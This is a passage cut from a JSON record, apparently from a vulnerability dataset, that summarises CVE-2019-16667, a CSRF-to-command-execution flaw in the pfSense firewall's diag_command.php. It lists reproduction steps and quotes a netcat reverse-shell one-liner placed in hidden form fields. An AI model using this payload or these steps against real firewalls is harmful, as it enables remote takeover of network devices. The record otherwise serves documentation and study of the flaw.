  "cve": "CVE-2019-16667",
  "source": "pastebin.com_449a718d_20250121_005316.html",
  "details": {
    "vulnerability": "CSRF leading to RCE",
    "root_cause": "The pfsense firewall is vulnerable to RCE chained with CSRF because it uses the `csrf magic` library, which allows tampering with the CSRF token values submitted when processing form requests.",
    "attack_vector": "An attacker crafts a malicious webpage containing a form with attacker-controlled input (e.g., a reverse shell command) as the CSRF token value. The attacker then uses social engineering to trick a victim into clicking a link to this page.",
    "impact": "Successful exploitation allows the attacker to gain lateral control of the victim's machine, enabling them to perform malicious actions on the victim's behalf, such as executing arbitrary commands.",
    "steps_to_reproduce": "1. Create a malicious HTML page with a form that submits to `http://pfsense/diag_command.php`.  2. Include hidden input fields in the form with the reverse shell command as the value for `txtCommand` and `txtRecallBuffer`.  3.  Trick the victim into accessing this page.  4. The page automatically submits the form, executing the command on the pfsense firewall.",
    "example_poc": "The provided HTML code demonstrates the CSRF attack. The form includes hidden fields with a reverse shell command (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4433 >/tmp/f`) injected into the `txtCommand` and `txtRecallBuffer` parameters.",
